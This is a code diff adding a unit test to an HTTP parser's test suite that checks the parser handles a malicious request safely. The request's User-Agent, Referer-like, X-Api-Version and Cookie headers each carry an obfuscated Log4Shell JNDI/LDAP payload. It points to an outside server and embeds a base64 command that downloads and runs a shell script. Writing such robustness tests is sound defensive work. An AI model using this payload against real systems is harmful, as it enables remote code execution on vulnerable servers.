@@ -763,3 +763,50 @@ class TestHttpParser(unittest.TestCase):
                 httpParserTypes.RESPONSE_PARSER,
                 enable_proxy_protocol=True,
             )
+
+    def test_is_safe_against_malicious_requests(self) -> None:
+        self.parser.parse(
+            b'GET / HTTP/1.1\r\n' +
+            b'Host: 34.131.9.210:443\r\n' +
+            b'User-Agent: ${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}:' +
+            b'//198.98.53.25:1389/TomcatBypass/Command/Base64d2dldCA0Ni4xNjEuNTIuMzcvRXhwbG9pd' +
+            b'C5zaDsgY2htb2QgK3ggRXhwbG9pdC5zaDsgLi9FeHBsb2l0LnNoOw==}\r\n' +
+            b'Content-Type: application/x-www-form-urlencoded\r\n' +
+            b'nReferer: ${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}:' +
+            b'//198.98.53.25:1389/TomcatBypass/Command/Base64d2dldCA0Ni4xNjEuNTIuMzcvRXhwbG9pd' +
+            b'C5zaDsgY2htb2QgK3ggRXhwbG9pdC5zaDsgLi9FeHBsb2l0LnNoOw==}\r\n' +
+            b'X-Api-Version: ${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}' +
+            b'://198.98.53.25:1389/TomcatBypass/Command/Base64d2dldCA0Ni4xNjEuNTIuMzcvRXhwbG9pd' +
+            b'C5zaDsgY2htb2QgK3ggRXhwbG9pdC5zaDsgLi9FeHBsb2l0LnNoOw==}\r\n' +
+            b'Cookie: ${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}:' +
+            b'//198.98.53.25:1389/TomcatBypass/Command/Base64d2dldCA0Ni4xNjEuNTIuMzcvRXhwbG9pd' +
+            b'C5zaDsgY2htb2QgK3ggRXhwbG9pdC5zaDsgLi9FeHBsb2l0LnNoOw==}' +
+            b'\r\n\r\n')
+        self.assertEqual(
+            self.parser.header(b'user-agent'),
+            b'${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}:' +
+            b'//198.98.53.25:1389/TomcatBypass/Command/Base64d2dldCA0Ni4xNjEuNTIuMzcvRXhwbG9pd' +
+            b'C5zaDsgY2htb2QgK3ggRXhwbG9pdC5zaDsgLi9FeHBsb2l0LnNoOw==}',
+        )
+        self.assertEqual(
+            self.parser.header(b'content-type'),
+            b'application/x-www-form-urlencoded',
+        )
+        self.assertEqual(
+            self.parser.header(b'nreferer'),
+            b'${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}:' +
+            b'//198.98.53.25:1389/TomcatBypass/Command/Base64d2dldCA0Ni4xNjEuNTIuMzcvRXhwbG9pd' +
+            b'C5zaDsgY2htb2QgK3ggRXhwbG9pdC5zaDsgLi9FeHBsb2l0LnNoOw==}',
+        )
+        self.assertEqual(
+            self.parser.header(b'X-Api-Version'),
+            b'${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}' +
+            b'://198.98.53.25:1389/TomcatBypass/Command/Base64d2dldCA0Ni4xNjEuNTIuMzcvRXhwbG9pd' +
+            b'C5zaDsgY2htb2QgK3ggRXhwbG9pdC5zaDsgLi9FeHBsb2l0LnNoOw==}',
+        )
+        self.assertEqual(
+            self.parser.header(b'cookie'),
+            b'${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}:' +
+            b'//198.98.53.25:1389/TomcatBypass/Command/Base64d2dldCA0Ni4xNjEuNTIuMzcvRXhwbG9pd' +
+            b'C5zaDsgY2htb2QgK3ggRXhwbG9pdC5zaDsgLi9FeHBsb2l0LnNoOw==}',
+        )
